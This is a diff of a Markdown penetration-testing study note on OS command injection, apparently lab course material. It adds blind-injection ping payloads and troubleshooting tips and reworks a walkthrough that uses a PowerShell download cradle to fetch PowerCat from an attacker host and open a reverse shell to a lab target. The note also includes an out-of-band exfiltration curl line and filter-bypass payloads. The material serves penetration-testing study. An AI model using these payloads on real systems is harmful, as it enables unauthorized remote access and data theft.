@@ -48,7 +48,8 @@ Input reflected in a system command?
 │   └── Burp Intruder with command injection wordlist
 │
 └── Blind injection? (no output)
-    ├── Time-based: ; sleep 5
+    ├── Time-based (Linux): ; sleep 5   or   ; ping -c 5 127.0.0.1
+    ├── Time-based (Windows): & ping -n 5 127.0.0.1
     ├── OOB: ; curl http://<LHOST>/?$(id)
     └── Write file: ; echo test > /var/www/html/test.txt
 ```
@@ -75,6 +76,7 @@ flowchart TD
 > - Special characters break the request → URL-encode them (`;` = `%3B`, space = `%20`, `&` = `%26`). See [[🔣 Encoding Reference]].
 > - Wrong separator for the OS → Linux uses `;`, `&&`, `||`; Windows CMD uses `&`. If one is filtered, try another.
 > - No reverse shell despite RCE → confirm your `python3 -m http.server` shows the GET for powercat.ps1 and that `nc -nvlp 4444` is listening before you fire the payload.
+> - `python3 -m http.server 80` fails with `OSError: [Errno 98] Address already in use` → another process already owns port 80 (often a leftover server from an earlier test). Find and kill it: `sudo lsof -i :80` then `sudo kill <PID>`, or just serve on a different port and update the download cradle URL to match.
 > Full list: [[⚠️ Common Errors & Troubleshooting]]
 
 > [!tip] Beginner note
@@ -84,7 +86,6 @@ flowchart TD
 - [HackTricks — Command Injection](https://book.hacktricks.xyz/pentesting-web/command-injection)
 - [PayloadsAllTheThings — CMDi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
 - [revshells.com](https://www.revshells.com) — reverse shell generator
-
 
 Web applications often need to interact with the underlying operating system, such as when a file is created through a file upload mechanism. Web applications should always offer specific APIs or functionalities that use prepared commands for the interaction with the system
 
@@ -107,7 +108,6 @@ curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive
 curl -X POST --data 'Archive=git version' http://192.168.50.189:8000/archive
 ```
 
-
 > [!info] Chaining commands past the filter
 > The filter only accepts input starting with `git`, so keep `git` and append your command after a separator. A URL-encoded semicolon (`%3B`) chains commands in both Bash and PowerShell; `&&` runs two consecutive commands, and a single `&` works in Windows CMD. `Archive=git%3Bipconfig` runs git and then `ipconfig`, returning the Windows IP configuration.
 
@@ -121,30 +121,13 @@ The output shows that both commands were executed. We can assume that there is a
 (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
 ```
 
-
 ```sh
 curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
 ```
 
 The output contains "PowerShell", meaning that our injected commands are executed in a PowerShell environment.
 
-Next, let's try to leverage command injection to achieve system access. We will use Powercat to create a reverse shell. Powercat is a PowerShell implementation of Netcat included in Kali. Let's start a new terminal, copy Powercat to the home directory for the kali user, and start a Python3 web server in the same directory.
-[https://github.com/besimorhino/powercat](https://github.com/besimorhino/powercat)
-With our web server serving powercat.ps1 and Netcat listener in place, we can now use curl in the first terminal to inject the following command. It consists of two parts delimited by a semicolon. The first part uses a PowerShell download cradle to load the Powercat function contained in the powercat.ps1 script from our web server. The second command uses the powercat function to create the reverse shell with the following parameters: -c to specify where to connect, -p for the port, and -e for executing a program.
-
-
-
-
-
-
-
-
-
-
-9.5. Wrapping up
-In this Module, we covered a variety of different common web application attacks. First, we explored how to display the contents of files outside of the web root with directory traversal attacks. Next, we used file inclusion to not only display the contents of files, but to also execute files by including them within the web application's running code. We then abused file upload vulnerabilities with executable and non-executable files. Finally, we learned how to leverage command injection to get access to a web application's underlying system.
-
-Understanding these kinds of attacks will prove extremely helpful in any kind of security assessment. When we exploit them in publicly accessible web applications over the internet, they may lead us to an initial foothold in the target's network. Alternatively, when we find vulnerabilities for these attacks in internal web services, they may provide us with lateral movement vectors. While the vulnerabilities are not dependent on specific programming languages or web frameworks, their exploitation may be. Therefore, we should always take the time to briefly understand the web technologies being used before we attempt to exploit them. With the skills covered in this Learning Unit, we can identify and exploit a broad variety of web applications.
+Next, let's leverage command injection to achieve system access with **PowerCat** — a PowerShell implementation of Netcat included in Kali ([source](https://github.com/besimorhino/powercat)). Copy `powercat.ps1` into a working directory, then serve it and start the listener:
 
 ```sh
 cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
@@ -152,16 +135,17 @@ python3 -m http.server 80
 nc -nvlp 4444
 ```
 
+The injected command has two parts joined by a semicolon: a PowerShell download cradle that pulls the PowerCat function from Kali, then the PowerCat call itself (`-c` target, `-p` port, `-e` program to spawn):
 
-```sh
+```powershell
 IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell
 ```
 
+Sent via the vulnerable `Archive` parameter (URL-encoded):
 
 ```sh
 curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
 ```
-
 
 > [!info] Landing the shell
 > The Python web server logs a `GET /powercat.ps1 200` (the target pulled the script), and the Netcat listener catches the connection back:
